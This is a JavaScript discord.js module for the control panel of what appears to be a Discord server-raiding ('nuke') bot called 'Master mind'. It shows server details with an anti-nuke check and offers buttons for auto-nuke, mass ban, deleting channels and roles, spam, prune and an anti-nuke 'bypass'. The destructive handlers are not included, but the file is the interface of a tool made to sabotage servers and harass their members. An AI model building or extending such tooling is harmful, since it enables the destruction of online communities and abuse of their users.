const { 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle 
} = require("discord.js");

async function sendServerPanel(interaction) {
  const guild = interaction.guild;

  const embed = new EmbedBuilder()
    .setTitle("BitchEmNocky — Server Info")
    .setColor("#2b2d31")
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `🏠 **Server:** ${guild.name}\n` +
      `🆔 **ID:** ${guild.id}\n` +
      `👥 **Members:** ${guild.memberCount}\n` +
      `🟢 **Online:** ${guild.members.cache.filter(m => m.presence?.status === "online").size}\n` +
      `👑 **Owner ID:** ${guild.ownerId}\n` +
      `🛡️ **Verification Level:** ${guild.verificationLevel}\n` +
      `🚀 **Boosts:** ${guild.premiumSubscriptionCount || 0}\n` +
      `🔞 **NSFW Level:** ${guild.nsfwLevel}\n` +
      `🌐 **Locale:** ${guild.preferredLocale}\n` +
      `🧠 **Anti-nuke detected:** None\n\n` +
      `🤖 Using bot: **Master mind**\n` +
      `If the buttons are disabled, it means the server has fewer than 5 active members or you've been inactive for a long time.`
    )
    .setTimestamp();

  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("nuke").setLabel("KILL (AUTO NUKE)").setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId("create_channels").setLabel("CREATE CHANNELS").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("delete_channels").setLabel("DELETE CHANNELS").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("mass_ban").setLabel("MASS BAN").setStyle(ButtonStyle.Danger)
  );

  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("spam").setLabel("SPAM").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("bypass").setLabel(":star: BYPASS").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("create_roles").setLabel("CREATE ROLES").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("delete_roles").setLabel("DELETE ROLES").setStyle(ButtonStyle.Secondary)
  );

  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("prune").setLabel("PRUNE").setStyle(ButtonStyle.Secondary)
  );

  const row4 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("help").setLabel("HELP").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("back").setLabel("Back").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("leave").setLabel("LEAVE").setStyle(ButtonStyle.Danger)
  );

  await interaction.reply({
    embeds: [embed],
    components: [row1, row2, row3, row4]
  });
}

module.exports = { sendServerPanel };
